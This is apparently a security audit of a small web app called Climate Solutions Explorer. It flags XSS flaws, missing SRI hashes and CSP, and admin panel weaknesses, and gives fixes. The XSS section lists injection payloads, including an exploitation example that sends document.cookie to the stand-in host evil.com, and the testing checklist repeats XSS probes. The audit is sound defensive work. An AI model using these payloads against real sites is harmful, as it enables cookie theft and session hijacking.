# Security, Safety, and Privacy Audit

**Project**: Climate Solutions Explorer
**Audit Date**: 2026-01-14
**Status**: ⚠️ Moderate Risk - Action Required

---

## Executive Summary

This security audit identifies **critical XSS vulnerabilities** and missing security headers that should be addressed before production deployment. The application has good architectural decisions (no tracking, pinned dependencies) but requires immediate attention to input sanitization and Content Security Policy implementation.

### Risk Level: 🟡 MODERATE

**Critical Issues**: 1
**High Priority**: 2
**Medium Priority**: 3
**Low Priority**: 2

---

## 🔴 Critical Issues (Immediate Action Required)

### 1. Cross-Site Scripting (XSS) Vulnerabilities

**Risk Level**: 🔴 **CRITICAL**
**Impact**: Code execution, session hijacking, data theft
**Affected Files**:
- [js/utilities.js:73-226](../js/utilities.js#L73-L226)
- [js/main.js](../js/main.js) (multiple locations)

**Description**:
User-provided data is directly inserted into HTML without sanitization using `.innerHTML`:

```javascript
// VULNERABLE CODE - utilities.js:73
detailsHtml += `<div style="font-weight: 500;"><a href="${itemUrl}" target="_blank">${itemTitle}</a></div>`;

// VULNERABLE CODE - utilities.js:195
contentHtml += `<div class="item-title"><a href="${itemUrl}" target="_blank">${itemTitle}</a></div>`;

// VULNERABLE CODE - utilities.js:209
contentHtml += `<div class="item-description">${itemDescription}</div>`;
```

**Attack Vectors**:
1. **Malicious titles**: `<script>alert('XSS')</script>`
2. **Malicious URLs**: `javascript:alert('XSS')`
3. **Malicious descriptions**: `<img src=x onerror="alert('XSS')">`
4. **Malicious tags**: `<script>steal(document.cookie)</script>`

**Exploitation Scenario**:
```json
{
  "title": "<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>",
  "url": "javascript:alert('XSS')",
  "description": "<script>/* malicious code */</script>"
}
```

**Recommended Fix**: Implement DOMPurify sanitization library

---

## 🟠 High Priority Issues

### 2. Missing Subresource Integrity (SRI) Hashes

**Risk Level**: 🟠 **HIGH**
**Impact**: CDN compromise, supply chain attack
**Affected File**: [index.html:9-13](../index.html#L9-L13)

**Description**:
CDN scripts lack SRI hashes, allowing compromised CDNs to serve malicious code:

```html
<!-- VULNERABLE - No SRI hash -->
<script src="https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js"></script>
```

**Recommended Fix**:
```html
<!-- SECURE - With SRI hash -->
<script src="https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js"
        integrity="sha384-[HASH]"
        crossorigin="anonymous"></script>
```

**Action Required**: Generate and add SRI hashes for all CDN resources.

---

### 3. Missing Content Security Policy (CSP)

**Risk Level**: 🟠 **HIGH**
**Impact**: XSS mitigation failure, inline script execution
**Affected**: All pages (no CSP headers)

**Description**:
No Content Security Policy headers to restrict resource loading and prevent XSS attacks.

**Recommended CSP**:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net https://unpkg.com 'sha256-[HASH]';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
">
```

**Benefits**:
- Blocks inline scripts (XSS mitigation)
- Restricts CDN domains
- Prevents clickjacking
- Enforces HTTPS

---

## 🟡 Medium Priority Issues

### 4. Admin Panel Security

**Risk Level**: 🟡 **MEDIUM**
**Impact**: Unauthorized data access
**Affected File**: [Admin_Panel/Code.gs:13-14](../Admin_Panel/Code.gs#L13-L14)

**Current Implementation**:
```javascript
const APPROVED_ADMINS = [
  'aphilosof@gmail.com'
];
```

**Issues**:
1. Hardcoded admin email in source code
2. Admin panel URL exposed in source ([Code.gs:298](../Admin_Panel/Code.gs#L298))
3. No rate limiting on admin actions
4. No audit logging

**Recommendations**:
- ✅ **Current strength**: Email-based access control (Google Apps Script)
- ⚠️ **Improve**: Move admin list to Script Properties (not code)
- ⚠️ **Improve**: Add rate limiting for approval actions
- ⚠️ **Improve**: Implement audit logging for all admin actions
- ⚠️ **Improve**: Obfuscate admin panel URL or add token authentication

---

### 5. Data Validation Missing

**Risk Level**: 🟡 **MEDIUM**
**Impact**: Malformed data, rendering errors
**Affected**: JSON data loading

**Description**:
No schema validation for loaded JSON data. Application assumes data structure is correct.

**Recommended Fix**:
```javascript
// Add JSON schema validation
import Ajv from 'ajv';
const ajv = new Ajv();
const schema = {
  type: 'object',
  required: ['name', 'children'],
  properties: {
    name: { type: 'string', maxLength: 200 },
    children: { type: 'array' },
    // ... more schema
  }
};
const validate = ajv.compile(schema);
if (!validate(data)) {
  console.error('Invalid data structure:', validate.errors);
}
```

---

### 6. No HTTPS Enforcement

**Risk Level**: 🟡 **MEDIUM**
**Impact**: Man-in-the-middle attacks, data interception
**Recommendation**:
- Verify GitHub Pages deployment uses HTTPS
- Add HTTP Strict Transport Security (HSTS) header
- Redirect HTTP → HTTPS

---

## 🟢 Low Priority Issues

### 7. No Privacy Policy

**Risk Level**: 🟢 **LOW**
**Impact**: Legal compliance, user trust

**Recommendation**: Create `docs/PRIVACY.md` documenting:
- No analytics or tracking
- No cookies (except localStorage for favorites)
- Form submission data handling
- Data retention policy
- Contact information for privacy inquiries

---

### 8. Dependency Vulnerabilities

**Risk Level**: 🟢 **LOW**
**Status**: ✅ Partially mitigated (pinned versions)

**Current State**:
- ✅ Dependencies pinned to specific versions
- ⚠️ No automated vulnerability scanning
- ⚠️ No update schedule

**Recommendation**:
- Add Dependabot or Snyk for automated scanning
- Review dependencies quarterly for known CVEs
- Document update/patching process

---

## ✅ Good Security Practices Found

### Positive Findings:

1. **✅ No Analytics/Tracking**
   - No Google Analytics, Facebook Pixel, or third-party trackers
   - Privacy-respecting design

2. **✅ Pinned CDN Dependencies**
   - All CDN libraries use specific versions (not `@latest`)
   - Prevents unexpected breaking changes

3. **✅ Admin Access Control**
   - Email-based admin whitelist in Google Apps Script
   - Proper access verification before sensitive operations

4. **✅ Error Handling**
   - Admin email notifications on form processing errors
   - Console logging for debugging

5. **✅ Version Control**
   - Automated versioning with changelog
   - Full Git history for audit trail

6. **✅ Separate Public Repository**
   - Admin panel NOT deployed to public repository
   - Production deployment excludes sensitive files

---

## Implementation Priority

### Phase 1: Critical Fixes (Deploy within 1 week)
1. ❗ **Add XSS sanitization** using DOMPurify
2. ❗ **Add SRI hashes** to all CDN scripts
3. ❗ **Implement CSP headers**

### Phase 2: High Priority (Deploy within 2 weeks)
4. 🔸 Improve admin panel security (move credentials to Script Properties)
5. 🔸 Add JSON schema validation
6. 🔸 Verify HTTPS enforcement

### Phase 3: Medium Priority (Deploy within 1 month)
7. 🔹 Create privacy policy
8. 🔹 Add dependency vulnerability scanning
9. 🔹 Implement rate limiting for admin actions

---

## Detailed Remediation Guide

### Fix 1: XSS Prevention with DOMPurify

**Step 1**: Add DOMPurify to [index.html](../index.html):
```html
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"
        integrity="sha384-[GENERATE_HASH]"
        crossorigin="anonymous"></script>
```

**Step 2**: Update [js/utilities.js](../js/utilities.js):
```javascript
// BEFORE (VULNERABLE)
contentHtml += `<div class="item-title">${itemTitle}</div>`;

// AFTER (SECURE)
const sanitizedTitle = DOMPurify.sanitize(itemTitle, {
  ALLOWED_TAGS: [], // Strip all HTML
  KEEP_CONTENT: true
});
contentHtml += `<div class="item-title">${sanitizedTitle}</div>`;

// For URLs - validate protocol
function sanitizeUrl(url) {
  const allowedProtocols = ['http:', 'https:', 'mailto:'];
  try {
    const parsed = new URL(url);
    if (allowedProtocols.includes(parsed.protocol)) {
      return DOMPurify.sanitize(url, { ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto):)/i });
    }
  } catch (e) {
    return '#'; // Invalid URL
  }
  return '#';
}
```

**Step 3**: Apply sanitization to ALL user data:
- Item titles
- Item descriptions
- Item URLs
- Item authors
- Item tags
- Node names

---

### Fix 2: Generate SRI Hashes

**Method 1**: Using online tool
1. Visit https://www.srihash.org/
2. Enter CDN URL
3. Copy generated `integrity` attribute

**Method 2**: Using OpenSSL
```bash
curl -s https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js | \
  openssl dgst -sha384 -binary | \
  openssl base64 -A
```

**Method 3**: Using Node.js
```bash
npm install -g sri-cli
sri-hash https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js
```

---

### Fix 3: Implement CSP

**Add to [index.html](../index.html) `<head>` section**:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self'
    https://cdn.jsdelivr.net
    https://unpkg.com
    'sha256-[HASH_OF_INLINE_SCRIPT]';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
">
```

**For inline scripts**: Generate hash:
```bash
echo -n "YOUR_INLINE_SCRIPT_HERE" | openssl dgst -sha256 -binary | openssl base64 -A
```

---

## Testing Checklist

### Security Testing

- [ ] **XSS Testing**: Try injecting `<script>alert('XSS')</script>` in all form fields
- [ ] **URL Validation**: Try `javascript:alert('XSS')` as URL
- [ ] **HTML Injection**: Try `<img src=x onerror=alert('XSS')>` in descriptions
- [ ] **CSP Validation**: Use https://csp-evaluator.withgoogle.com/
- [ ] **SRI Verification**: Check browser console for integrity validation
- [ ] **HTTPS Enforcement**: Try accessing via HTTP
- [ ] **Admin Panel**: Verify non-admin emails are blocked

### Privacy Testing

- [ ] **No Cookies**: Verify no cookies set (except localStorage)
- [ ] **No Tracking**: Check browser DevTools Network tab for third-party requests
- [ ] **Data Retention**: Verify form data handling in Google Sheets

---

## Compliance Considerations

### GDPR (if serving EU users)
- ✅ No cookies without consent (localStorage is OK for favorites)
- ✅ No tracking/profiling
- ⚠️ Need privacy policy with data controller info
- ⚠️ Form submissions: Add consent checkbox
- ⚠️ Document data retention policy

### CCPA (if serving California users)
- ✅ No sale of personal data
- ⚠️ Add "Do Not Sell" link (even if not applicable)
- ⚠️ Privacy policy should mention CCPA rights

### Accessibility (WCAG 2.1)
- ⚠️ Add ARIA labels to visualization elements
- ⚠️ Ensure keyboard navigation works
- ⚠️ Add alt text to logo image

---

## Incident Response Plan

### If XSS Attack Detected:
1. Immediately take site offline
2. Review all form submissions in Google Sheets for malicious content
3. Sanitize database entries
4. Deploy sanitization fix
5. Notify users if personal data compromised

### If CDN Compromise Detected:
1. Switch to self-hosted libraries
2. Verify no malicious code executed
3. Check browser console logs
4. Review analytics for anomalies

---

## Contact for Security Issues

**Security Contact**: aphilosof@gmail.com
**Response Time**: 48 hours for critical issues
**PGP Key**: [Add if available]

---

## Changelog

**2026-01-14**: Initial security audit
- Identified 8 issues (1 critical, 2 high, 3 medium, 2 low)
- Recommended DOMPurify, SRI hashes, and CSP implementation
- Documented good security practices

---

## Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
- [SRI Hash Generator](https://www.srihash.org/)

---

**End of Security Audit**
